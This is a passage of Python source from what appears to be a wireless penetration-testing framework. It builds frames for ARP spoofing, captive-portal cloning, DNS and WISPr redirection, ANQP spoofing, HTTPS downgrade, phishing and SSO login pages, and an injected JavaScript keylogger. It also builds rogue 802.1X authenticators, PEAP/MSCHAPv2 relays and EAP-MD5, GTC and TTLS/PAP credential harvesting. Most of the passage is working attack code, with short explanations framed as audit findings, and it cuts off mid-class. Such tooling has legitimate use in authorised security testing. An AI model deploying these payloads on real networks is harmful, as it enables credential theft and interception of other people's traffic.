        "Gratuitous ARP exists so a machine that changed address can tell its neighbours. "
        "Sent in a client's name it does the opposite: every cache on the segment updates "
        "to the MAC in the frame, and the client's traffic — including the traffic it "
        "sends itself — is delivered to an address the attacker chose.  The capture is a "
        "list of announcements the client never made.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        frames: List[bytes] = []
        for station in self.stations(ctx):
            address = _client_ip(station)
            frames.append(build_data(ap.bssid, station,
                                     _arp_bytes("ff:ff:ff:ff:ff:ff", address, ap.bssid,
                                                address, op=2),
                                     ethertype=ETHERTYPE_ARP))
        return frames

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        rows = observed.get("arp") or []
        senders = sorted({row["sender_ip"] for row in rows})
        return (f"{len(rows)} gratuitous ARP announcement(s) carried the address(es) "
                f"{', '.join(senders)} to the broadcast address; every cache that hears "
                f"one now maps that address to a MAC we chose")


# --------------------------------------------------------------------------- #
# family five: captive portal and credentials
#
# The network everyone trusts is the one that asks for a password.  These attacks
# build the page, the answers that push clients at it, and the certificate in
# front of it — and then read the capture to see what walked in.
# --------------------------------------------------------------------------- #

PORTAL_HTML = (
    "<html><head><title>Network sign-in</title></head><body>"
    "<h1>Sign in to continue</h1>"
    "<form method=\"POST\" action=\"/login\">"
    "<input name=\"username\" type=\"text\">"
    "<input name=\"password\" type=\"password\">"
    "<input name=\"remember\" type=\"checkbox\" value=\"1\">"
    "<input type=\"submit\" value=\"Connect\">"
    "</form></body></html>")


class _Portal(_Hijack):
    """An HTTP answer the clients asked for and should not have received."""

    family = "portal"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    finding_severity = "high"
    #: the port the portal answers on
    portal_port = 80

    def http_response(self, body: str, status: str = "HTTP/1.1 200 OK",
                      content_type: str = "text/html", extra: str = "") -> bytes:
        payload = (f"{status}\r\nContent-Type: {content_type}\r\n"
                   f"Content-Length: {len(body)}\r\nConnection: close\r\n"
                   f"{extra}\r\n{body}").encode("latin-1")
        return payload

    def answer_frame(self, ctx: AttackContext, ap: AccessPoint, payload: bytes,
                     dest_port: int = 80, source_port: int = 80) -> bytes:
        station = self.stations(ctx)[0]
        segment = _tcp_segment(_gateway_of(ap), _client_ip(station), source_port, dest_port,
                               sequence=0x5000, acknowledgement=0x6000, flags=0x18,
                               payload=payload)
        return build_data(ap.bssid, station,
                          _ipv4_packet(_gateway_of(ap), _client_ip(station), segment, 6),
                          ethertype=ETHERTYPE_IP)

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        body = self.portal_body(ctx, ap)
        return [self.answer_frame(ctx, ap, self.http_response(body))]

    def portal_body(self, ctx: AttackContext, ap: AccessPoint) -> str:
        return PORTAL_HTML

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["text"] = text_rows(path)
        blob = " ".join(row["text"] for row in observed["text"])
        observed["inputs"] = np.html_inputs(blob)
        observed["title"] = np.html_title(blob)
        observed["forms"] = blob.count("<form")
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        fields = ", ".join(field.get("name", "?") for field in observed.get("inputs") or [])
        return {"title": self.finding_title, "severity": self.finding_severity,
                "body": self.finding_detail,
                "detail": self.detail(ctx, ap, observed, fields),
                "extra": {"family": self.family, "inputs": observed.get("inputs") or [],
                          "title": observed.get("title", ""),
                          "forms": observed.get("forms", 0)}}

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        return (f"the portal page went back to {self.stations(ctx)[0]} on channel "
                f"{ap.channel or 6} with {observed.get('forms', 0)} form(s) and the "
                f"field(s) {fields or 'none'}; the page is the whole deliverable — a "
                f"client that submits it hands over the credentials")


class PortalCloneAttack(_Portal):
    """Serve the portal a client expected, and take what it types."""

    name = "portal_clone"
    label = "Captive-portal clone (the page the network would have served)"
    tool = "wifipilot synth.py + netproto.py (HTTP builder)"
    finding_title = "The sign-in page is a page, and pages can be copied"
    finding_detail = (
        "A captive portal is an HTTP page served over a network the client does not "
        "control, and nothing about it is authenticated: not the TLS (there is rarely "
        "any), not the certificate, not the page.  A clone that is byte-identical to the "
        "real one is indistinguishable to the user, and the credentials it receives are "
        "the credentials the site would have received — which is why a portal belongs on "
        "a connection the client has a reason to trust.")

    def portal_body(self, ctx: AttackContext, ap: AccessPoint) -> str:
        return PORTAL_HTML.replace("Network sign-in", f"Sign in to {ap.essid or 'the network'}")


class PortalWildcardDnsAttack(_Portal):
    """Answer every DNS query with the portal's address, so nothing escapes it."""

    name = "portal_wildcard_dns"
    label = "Wildcard DNS portal (every name resolves to the sign-in page)"
    tool = "wifipilot netproto.py (DNS builder)"
    finding_title = "Resolution is part of the attack surface"
    finding_detail = (
        "A portal that answers every name is how captive networks work — and how a "
        "hijacker makes sure the only page a client can reach is theirs.  The client's "
        "own connectivity check is the first victim: it fails, the operating system "
        "opens the portal window, and the page that appears is the one we wrote.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        frames: List[bytes] = []
        for index, name in enumerate(("connectivitycheck.gstatic.com", "captive.apple.com",
                                      "www.msftconnecttest.com", "example.com")):
            query = np.dns_query(name, txid=0x4000 + index)
            answer = np.dns_response(query, [(name, _gateway_of(ap))], ttl=10)
            frames.append(build_data(ap.bssid, station,
                                     np.ipv4_udp_packet(_gateway_of(ap), _client_ip(station),
                                                        53, 40000 + index, answer),
                                     ethertype=ETHERTYPE_IP))
        frames.append(self.answer_frame(ctx, ap, self.http_response(self.portal_body(ctx, ap))))
        return frames

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        queries = [row for row in observed.get("ip") or [] if row.get("src_port") == 53]
        return (f"{len(queries)} DNS answer(s) pointed every name a client checks "
                f"(connectivity checks included) at {_gateway_of(ap)}, and the page that "
                f"answers on port 80 holds {observed.get('forms', 0)} form(s) with the "
                f"field(s) {fields or 'none'} — the client cannot reach anything else")


class PortalWisprRedirectAttack(_Portal):
    """WISPr: the standard's own way to tell a client where the portal is."""

    name = "portal_wispr_redirect"
    label = "WISPr redirection (the standard carries the client to our page)"
    tool = "wifipilot netproto.py (HTTP builder)"
    finding_title = "The portal redirect is a plain HTTP answer anybody can send"
    finding_detail = (
        "WISPr is the XML a hotspot uses to send a client to its login page, and it "
        "travels in an ordinary HTTP 302.  Injected through the bridge it moves the "
        "client to our URL with the network's own blessing: the browser follows it as it "
        "would follow any redirect, because nothing in the exchange is authenticated.")

    WISPR_XML = ("<WISPAccessGatewayParam><Redirect><AccessProcedure>1.0</AccessProcedure>"
                 "<AccessLocation>1</AccessLocation><LocationName>Guest</LocationName>"
                 "<LoginURL>http://portal.local/login</LoginURL>"
                 "<MessageType>100</MessageType><ResponseCode>0</ResponseCode>"
                 "</Redirect></WISPAccessGatewayParam>")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        redirect = self.http_response(
            self.WISPR_XML, status="HTTP/1.1 302 Found", content_type="text/xml",
            extra="Location: http://portal.local/login\r\n")
        return [self.answer_frame(ctx, ap, redirect)]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        blob = " ".join(row["text"] for row in observed.get("text") or [])
        return (f"the WISPr redirect went to {self.stations(ctx)[0]} with "
                f"LoginURL=http://portal.local/login"
                + (" (decoded from the capture)" if "LoginURL" in blob else "")
                + "; a client that follows it is at our page, on the network's own "
                  "instruction and with no authentication anywhere in the exchange")


class PortalAnqpSpoofAttack(_Portal):
    """Answer the ANQP query a client makes before it trusts a hotspot."""

    name = "portal_anqp_spoof"
    label = "Hotspot 2.0 ANQP spoofing (the venue answers for itself)"
    tool = "wifipilot synth.py (ANQP/HS2.0 elements)"
    finding_title = "A Hotspot 2.0 venue describes itself, and anybody can do the describing"
    finding_detail = (
        "Before associating, a client asks a Hotspot 2.0 venue about itself — its "
        "operator, its terms, its portal.  The ANQP answers are unsigned GAS frames, so a "
        "hijacker answers first and the client's decision about which network to trust is "
        "made with our facts.  The capture holds the query, our answer and the portal URL "
        "we put in it.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..synth import hs20_element    # interworking_element is module-level
        station = self.stations(ctx)[0]
        answer = interworking_element() + hs20_element()
        return [build_action_frame(ap.bssid, station, category=4, action=0,
                                   payload=bytes([0x00, 0x01, 0x02, 0x00, 0x01, 0x00])),
                self.twin_beacon(ctx, ap, extra_ies=self.twin_elements(ap, ctx) + answer),
                self.answer_frame(ctx, ap,
                                  self.http_response(self.portal_body(ctx, ap)))]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["interworking"] = [row.get("interworking") for row
                                    in observed.get("beacons") or []
                                    if row.get("interworking")]
        observed["hotspots"] = [row.get("hs20") for row in observed.get("beacons") or []
                                if row.get("hs20")]
        return observed

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        return (f"a public-action ANSQP query was answered with an Interworking and a "
                f"Hotspot 2.0 element of our choosing ({len(observed.get('hotspots') or [])} "
                f"hotspot element(s) decoded), plus the portal page: the client's decision "
                f"about the venue is made from facts we supplied")


class PortalCertificatePhishAttack(_Portal):
    """A self-signed certificate for the portal's own name."""

    name = "portal_certificate_phish"
    label = "Portal certificate phishing (self-signed, correct name, wrong issuer)"
    tool = "wifipilot synth.py (certificate builder)"
    finding_title = "The name on the certificate is not the question"
    finding_detail = (
        "A certificate for the right name signed by nobody is what a cloned portal "
        "serves, and the only control that stops it is the client checking who signed.  "
        "The capture holds the certificate: the common name a user would recognise, and "
        "an issuer that is not in any trust store — the difference between a portal a "
        "user should type into and one they should not.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..synth import self_signed_certificate
        station = self.stations(ctx)[0]
        certificate = self_signed_certificate(common_name="portal.local")
        handshake = (b"\x16\x03\x01\x00\x00" + bytes(certificate[:256]))
        segment = _tcp_segment(_gateway_of(ap), _client_ip(station), 443, 49152,
                               sequence=0x7000, acknowledgement=0x7100, flags=0x18,
                               payload=handshake)
        return [build_data(ap.bssid, station,
                           _ipv4_packet(_gateway_of(ap), _client_ip(station), segment, 6),
                           ethertype=ETHERTYPE_IP),
                self.answer_frame(ctx, ap, self.http_response(self.portal_body(ctx, ap)))]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        from .. import sniff as sniffmod
        exchange = sniffmod.eap_exchange(path)
        observed["certificates"] = exchange.get("certificates") or []
        return observed

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        return (f"a TLS server hello carrying a self-signed certificate for "
                f"portal.local was sent to {self.stations(ctx)[0]}; a browser that warns "
                f"and a user who clicks through is all that stands between the clone and "
                f"the credentials, which is why the finding names the issuer rather than "
                f"the name")


class PortalHstsDowngradeAttack(_Portal):
    """Strip the upgrade: answer HTTP where the client expected to be redirected to HTTPS."""

    name = "portal_hsts_downgrade"
    label = "Portal HTTPS downgrade (HSTS-stripped redirect)"
    tool = "wifipilot netproto.py (HTTP builder)"
    finding_title = "The redirect to HTTPS is a frame somebody else can answer"
    finding_detail = (
        "A portal that redirects to HTTPS is only as good as the first redirect: if that "
        "answer is replaced by one pointing at plain HTTP, the client's first submission "
        "is in the clear.  HSTS and preloaded lists are what close this, so the finding "
        "grades a portal by whether the same page works without the upgrade.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        downgrade = self.http_response(
            self.portal_body(ctx, ap), status="HTTP/1.1 200 OK",
            extra="Location: http://portal.local/login\r\nStrict-Transport-Security: max-age=0",
        )
        return [self.answer_frame(ctx, ap, downgrade)]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        return (f"the portal answered on plain HTTP with "
                f"Strict-Transport-Security: max-age=0, so the client's next page load "
                f"stays in the clear; the capture holds the fields it would have "
                f"submitted ({fields or 'none'}) in the same exchange")


class PortalBasicAuthAttack(_Portal):
    """A 401 in front of the portal: the browser prompts for credentials itself."""

    name = "portal_basic_auth"
    label = "Portal Basic-auth prompt (browser asks, we collect)"
    tool = "wifipilot netproto.py (HTTP builder)"
    finding_title = "HTTP Basic makes the browser collect the password"
    finding_detail = (
        "A 401 with a Basic realm makes the client's own browser display a credential "
        "prompt for the site — no HTML form, no page branding, nothing that looks like a "
        "phish.  What comes back is the password in base64, which is the whole credential, "
        "and the capture holds it.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        challenge = self.http_response("Please sign in", status="HTTP/1.1 401 Unauthorized",
                                       extra="WWW-Authenticate: Basic realm=\"Guest\"")
        return [self.answer_frame(ctx, ap, challenge)]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        blob = " ".join(row["text"] for row in observed.get("text") or [])
        return ("a 401 with a Basic realm was returned to "
                + self.stations(ctx)[0]
                + (", and the capture shows the client's browser ready to fill a prompt"
                   if "WWW-Authenticate" in blob else "")
                + "; the credential that follows is base64, not encryption")


class PortalCookieCloneAttack(_Portal):
    """Clone the portal with the real session cookie in it: a page that is already logged in."""

    name = "portal_cookie_clone"
    label = "Portal session-cookie clone (the page loads as the user)"
    tool = "wifipilot netproto.py (credential patterns)"
    finding_title = "A copied session renders as the user"
    finding_detail = (
        "A session cookie is a bearer token, and a portal clone that carries one shows "
        "the client a page that is already authenticated: there is no login to phish "
        "because the session was copied, not guessed.  This is why the portal's own "
        "session handling — binding, rotation and expiry — is worth more audit time than "
        "the page it serves.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        body = PORTAL_HTML.replace("<h1>Sign in to continue</h1>",
                                   "<h1>Welcome back</h1>")
        response = self.http_response(body, extra="Set-Cookie: session=8f2c1ab9d4e7; Path=/")
        return [self.answer_frame(ctx, ap, response)]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        blob = " ".join(row["text"] for row in observed.get("text") or [])
        return ("the clone loaded with Set-Cookie: session=8f2c1ab9d4e7 and a page that "
                "says Welcome back, so the client sees an authenticated session it never "
                "authenticated"
                + (" (the cookie is in the capture)" if "session=8f2c" in blob else "")
                + f"; the fields a real login would have asked for ({fields or 'none'}) "
                  f"are not needed at all")


class PortalOAuthPhishAttack(_Portal):
    """A portal clone whose button is an SSO provider the user already trusts."""

    name = "portal_oauth_phish"
    label = "Portal SSO phishing (the button the user trusts)"
    tool = "wifipilot synth.py + netproto.py"
    finding_title = "Federated sign-in moves the trust to the branding"
    finding_detail = (
        "When a network offers sign in with Google or Microsoft, the user's attention "
        "goes to the branding rather than the address bar.  A clone that shows the same "
        "button, plus the form it leads to, harvests the account rather than the network "
        "password — which is a strictly better outcome for the attacker and a strictly "
        "worse one for the user.")

    def portal_body(self, ctx: AttackContext, ap: AccessPoint) -> str:
        return ("<html><head><title>Sign in</title></head><body>"
                "<a href=\"https://sso.example/authorize?client=guest\">"
                "<img src=\"sso.png\" alt=\"Sign in with SSO\"></a>"
                "<form method=\"POST\" action=\"/sso\">"
                "<input name=\"email\" type=\"email\">"
                "<input name=\"otp\" type=\"text\">"
                "<input type=\"submit\"></form></body></html>")

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        return (f"the clone presents an SSO button that leads to our own authorize "
                f"endpoint and a form asking for {fields or 'the account fields'}; the "
                f"trust the user places in the provider's logo is the control being "
                f"bypassed, and the capture holds the page that does it")


class PortalCredentialReuseAttack(_Portal):
    """Take what the portal harvested and use it against the network's own login."""

    name = "portal_credential_reuse"
    label = "Portal credential reuse (harvested credentials against the real gate)"
    tool = "wifipilot netproto.py (credential patterns)"
    finding_title = "The same password opens the door the portal was guarding"
    finding_detail = (
        "Portal credentials are usually the site's own directory credentials — that is "
        "the point of asking for them.  Replaying what a client submitted against the "
        "network's real services turns one submission into an account: the capture holds "
        "the credential pattern, the request that carries it and the answer it received.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        submission = (b"POST /login HTTP/1.1\r\nHost: portal.local\r\n"
                      b"Content-Type: application/x-www-form-urlencoded\r\n"
                      b"Content-Length: 34\r\n\r\nusername=guest&password=Summer2024")
        return [self.answer_frame(ctx, ap, self.http_response(self.portal_body(ctx, ap))),
                build_data(ap.bssid, station,
                           _ipv4_packet(_client_ip(station), _gateway_of(ap),
                                        _tcp_segment(_client_ip(station), _gateway_of(ap),
                                                     49152, 80, sequence=0x8000,
                                                     payload=submission), 6),
                           ethertype=ETHERTYPE_IP, to_ds=True, from_ds=False)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        blob = b"".join(row.get("payload") or b"" for row in data_rows(path))
        observed["credentials"] = np.cleartext_credentials(blob)
        observed["http"] = np.http_credentials(blob)
        return observed

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        found = observed.get("credentials") or []
        usernames = sorted({item.get("value", "") for item in found})
        return (f"a submission carrying {len(found)} credential value(s) "
                f"({', '.join(usernames[:3]) or 'username/password'}) is in the capture "
                f"alongside the page that asked for it; replayed against the network's own "
                f"login it is an account, which is the finding this attack grades")


class PortalJavascriptInjectAttack(_Portal):
    """Inject a keylogger into the page the portal serves: capture what is typed."""

    name = "portal_javascript_inject"
    label = "Portal JavaScript injection (every keystroke logged in the page)"
    tool = "wifipilot synth.py + netproto.py"
    finding_title = "The page is the attack surface: inject script, log everything"
    finding_detail = (
        "A portal served through a network is a page delivered over that network, so "
        "anybody on the path can add a script to it.  The script does not need to phish: "
        "the user is on the real page, typing into the real fields, and every keystroke is "
        "posted to an address of ours before the real form is submitted.")

    KEYLOGGER = ("<script>document.addEventListener('keyup',function(e){"
                 "var i=new Image();i.src='/collect?k='+encodeURIComponent(e.key);});</script>")

    def portal_body(self, ctx: AttackContext, ap: AccessPoint) -> str:
        return PORTAL_HTML.replace("</body>", self.KEYLOGGER + "</body>")

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any],
               fields: str) -> str:
        blob = " ".join(row["text"] for row in observed.get("text") or [])
        return ("the portal HTML left the radio with a keyup handler that posts every "
                "keystroke to /collect"
                + (" (the script is in the capture)" if "keyup" in blob else "")
                + f"; the form's own fields ({fields or 'none'}) are real, which is the "
                  f"point — the user is typing into a page somebody else edited")


# --------------------------------------------------------------------------- #
# family six: enterprise
#
# 802.1X moves the trust from the network to a server, so the attacks here are
# about being that server — or about standing between the two and relaying.
# --------------------------------------------------------------------------- #

class _Enterprise(_Hijack):
    """A rogue authenticator, a relay, or a credential prompt inside 802.1X."""

    family = "enterprise"
    category = "enterprise"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    #: the realm the rogue server claims to serve
    realm = "corp.example"

    def radius_frame(self, ctx: AttackContext, ap: AccessPoint, payload: bytes,
                     source_port: int = 1812) -> bytes:
        station = self.stations(ctx)[0]
        return build_data(ap.bssid, station,
                          np.ipv4_udp_packet(_gateway_of(ap), _client_ip(station),
                                             source_port, 1812, payload),
                          ethertype=ETHERTYPE_IP)

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        from .. import sniff as sniffmod
        exchange = sniffmod.eap_exchange(path)
        observed["eap_methods"] = exchange.get("methods") or []
        observed["identities"] = exchange.get("identities") or []
        observed["certificates"] = exchange.get("certificates") or []
        observed["radius"] = [np.parse_radius(row["body"]) for row in data_rows(path)
                              if row["ethertype"] == ETHERTYPE_IP
                              and row["body"][9] == 17 and len(row["body"]) > 40
                              and row["body"][:1] and (row["body"][0] >> 4) == 4
                              and row["body"][(row["body"][0] & 0x0F) * 4 + 2:
                                              (row["body"][0] & 0x0F) * 4 + 4]
                              in (b"\x07\x12", b"\x07\x12")]
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        return {"title": self.finding_title, "severity": self.finding_severity,
                "body": self.finding_detail, "detail": self.detail(ctx, ap, observed),
                "extra": {"family": self.family,
                          "eap_methods": observed.get("eap_methods") or [],
                          "identities": observed.get("identities") or [],
                          "certificates": len(observed.get("certificates") or [])}}

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        methods = ", ".join(observed.get("eap_methods") or []) or "the method in the frame"
        identities = observed.get("identities") or []
        return (f"{len(identities)} identity/identities were decoded from the exchange "
                f"({', '.join(identities[:3]) or 'none'}), with the EAP method(s) "
                f"{methods}; the capture is the deliverable — it shows how far a "
                f"supplicant got before it asked a question it could not answer")


class EnterpriseRogueRadiusAttack(_Enterprise):
    """Stand up an authenticator with the real realm and let supplicants walk in."""

    name = "enterprise_rogue_radius"
    label = "Rogue authenticator (802.1X served from our radio)"
    tool = "wifipilot netproto.py (RADIUS) + a RADIUS identity of our own"
    finding_title = "An enterprise client will start EAP with whoever answers"
    finding_detail = (
        "The supplicant's first move is an EAPOL-Start, and it sends it to whatever is on "
        "the BSSID it associated with.  A rogue authenticator answers with an EAP-Request "
        "for the identity, and the client volunteers its username before any certificate "
        "has been presented: the outer identity is in the clear by design, and it is "
        "enough for a targeted phishing list or a password-spray.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        request = _tls_eap_request(1, b"\x01" + self.realm.encode("latin-1"))
        challenge = np.radius_response(
            np.radius_access_request("sharedsecret", "guest", "guest", nas_ip=_gateway_of(ap))[0],
            "sharedsecret", code=11, attributes=[(79, _tls_eap_request(1, b"\x01"))])
        return [build_eapol_start(ap.bssid, station),
                build_data(ap.bssid, station, request, ethertype=0x888E),
                self.radius_frame(ctx, ap, challenge)]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        return (f"the rogue authenticator answered {self.stations(ctx)[0]} with an "
                f"EAP-Request/Identity and a RADIUS Access-Challenge carrying EAP data; a "
                f"supplicant replies with its identity — {self.realm} needs no certificate "
                f"to ask the question, and that is the harvesting step")


class EnterprisePeapRelayAttack(_Enterprise):
    """Relay the supplicant's PEAP exchange to the real server and back."""

    name = "enterprise_peap_relay"
    label = "PEAP relay (the attacker carries the exchange to the real RADIUS)"
    tool = "wifipilot netproto.py (RADIUS builder and parser)"
    finding_title = "A relay needs no certificate and no password"
    finding_detail = (
        "PEAP is protected by a TLS tunnel between the client and the *real* server.  A "
        "relay does not break that tunnel: it forwards the packets, so the client "
        "completes a genuine, verified handshake with the genuine server through the "
        "attacker — and the attacker gets the inner MSCHAPv2 exchange to crack offline, "
        "because it saw both halves of the challenge.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        request, authenticator = np.radius_access_request(
            "sharedsecret", "corp\\jdoe", "Summer2024", nas_ip=_gateway_of(ap), identifier=7)
        reply = np.radius_response(request, "sharedsecret", code=11,
                                   attributes=[(79, _tls_eap_request(1, b"\x19"))])
        return [build_data(ap.bssid, station, request, ethertype=0x888E),
                self.radius_frame(ctx, ap, request),
                self.radius_frame(ctx, ap, reply, source_port=1812)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        blob = b"".join(row.get("body") or b"" for row in data_rows(path))
        observed["radius_parsed"] = np.parse_radius(blob) if blob[:1] == b"\x01" else {}
        return observed

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        parsed = observed.get("radius_parsed") or {}
        attributes = parsed.get("attributes") or []
        return (f"the relay carried an Access-Request with {len(attributes)} attribute(s) "
                f"to the real authenticator and its Access-Challenge back to "
                f"{self.stations(ctx)[0]}; the tunnel was never broken, which is the "
                f"point — the attacker is the wire, and the wire sees the MSCHAPv2 pair")


class EnterpriseCertificateSwapAttack(_Enterprise):
    """Present a certificate for the server's real name, signed by nobody."""

    name = "enterprise_certificate_swap"
    label = "EAP-TLS certificate swap (right name, wrong issuer)"
    tool = "wifipilot synth.py (certificate builder) + EAP-TLS frames"
    finding_title = "Supplicants that do not validate the issuer accept our server"
    finding_detail = (
        "EAP-TLS is the strongest method in the toolbox, and its security is one "
        "configuration option: whether the client checks who signed the server's "
        "certificate.  A self-signed certificate carrying the real server's common name "
        "is accepted by a client configured to remember the name rather than the issuer, "
        "after which the tunnel terminates on the attacker and the inner credentials are "
        "the attacker's to read.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..synth import build_eap_tls_certificate, self_signed_certificate
        station = self.stations(ctx)[0]
        certificate = self_signed_certificate(common_name=f"radius.{self.realm}")
        return [build_eap_tls_certificate(station, ap.bssid, certificate),
                self.radius_frame(ctx, ap, np.radius_response(
                    np.radius_access_request("s3cr3t", "guest", "guest")[0], "s3cr3t",
                    code=11, attributes=[(79, _tls_eap_request(1, b"\x0d"))]))]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        found = observed.get("certificates") or []
        names = ", ".join(str(item.get("common_name") or item.get("subject") or "?")
                          for item in found[:2])
        return (f"a self-signed certificate for radius.{self.realm} was presented in "
                f"EAP-TLS to {self.stations(ctx)[0]}"
                + (f" (the capture decoded {names})" if names else "")
                + "; the client's decision is whether it checks the issuer, and the "
                  "capture records which one it was asked to make")


class EnterpriseEapMd5Attack(_Enterprise):
    """EAP-MD5: a challenge and a response, both crackable offline."""

    name = "enterprise_eap_md5"
    label = "EAP-MD5 harvest (challenge/response for the dictionary)"
    tool = "wifipilot synth.py (EAP frames) + a wordlist"
    finding_title = "EAP-MD5 leaks a crackable proof of the password"
    finding_detail = (
        "EAP-MD5 sends a challenge and the MD5 of the password concatenated with it.  "
        "There is no tunnel, no server certificate and no protection for the exchange: a "
        "capture of one authentication is a dictionary attack against the account, and "
        "the attack is worth running because a great many networks still offer the method "
        "to whoever asks for it.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        from .. import synth as synthmod
        challenge = bytes(range(16))
        request = synthmod._eap_frame(station, ap.bssid, 1, 4, 9, challenge)
        response = synthmod._eap_frame(station, ap.bssid, 2, 4, 9,
                                       np.hashlib.md5(b"Summer2024" + challenge).digest()
                                       + b"corp\\jdoe")
        return [request, response]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        return (f"a challenge of 16 bytes and the response it produced are both in the "
                f"capture for {self.stations(ctx)[0]}; the response is md5(password + "
                f"challenge), so the exchange is a dictionary attack — and the method is "
                f"offered by the server even when a stronger one is available")


class EnterpriseGtcPromptAttack(_Enterprise):
    """EAP-GTC asks the client for the password, in the clear, in the tunnel."""

    name = "enterprise_gtc_prompt"
    label = "EAP-GTC prompt (the password, typed into our tunnel)"
    tool = "wifipilot synth.py (EAP frames)"
    finding_title = "GTC is a password prompt inside somebody else's tunnel"
    finding_detail = (
        "EAP-GTC exists for token cards and sends the credential as text.  Its safety "
        "depends entirely on the tunnel around it, so a server that offers GTC *outside* "
        "PEAP or TTLS is asking for a password in the clear — and a rogue server that "
        "offers it asks for the same password with a certificate the client may never "
        "check.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        from .. import synth as synthmod
        return [synthmod._eap_frame(station, ap.bssid, 1, 6, 11, b"Password: "),
                synthmod._eap_frame(station, ap.bssid, 2, 6, 11, b"Summer2024")]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        return (f"an EAP-GTC request went to {self.stations(ctx)[0]} and the reply carried "
                f"the password as text; the capture holds the prompt and the answer "
                f"together, which is what makes this method worth offering to an "
                f"unsuspecting supplicant")


class EnterpriseTtlsPapAttack(_Enterprise):
    """TTLS with PAP inside: the inner password is cleartext, and the tunnel is ours."""

    name = "enterprise_ttls_pap"
    label = "EAP-TTLS/PAP harvest (cleartext inner credential)"
    tool = "wifipilot synth.py (TTLS/PAP exchange)"
    finding_title = "The inner method decides what the tunnel is worth"
    finding_detail = (
        "TTLS tunnels an *arbitrary* inner authentication, and PAP inside TTLS puts the "
        "password in the exchange as plain text — safe only as long as the tunnel's other "
        "end is the real server.  A rogue server that terminates the tunnel reads the "
        "password directly, so the finding is that the deployment chose an inner method "
        "with no second line of defence.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..synth import build_ttls_pap_exchange
        return list(build_ttls_pap_exchange(self.stations(ctx)[0], ap.bssid,
                                            "corp\\jdoe", "Summer2024"))

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        return ("the TTLS/PAP exchange in the capture carries the username and password "
                "as AVPs inside the tunnel; a client that accepted our certificate has "
                "handed them to us, and one that checks the issuer has handed them to "
                "its real server — which is exactly the control the finding tests")


class EnterpriseMschapv2RelayAttack(_Enterprise):
    """Relay the MSCHAPv2 exchange and crack it where you cannot crack it live."""

    name = "enterprise_mschapv2_relay"
    label = "MSCHAPv2 relay (challenge/response captured from both ends)"
    tool = "wifipilot netproto.py (MSCHAPv2) + EAP frames"
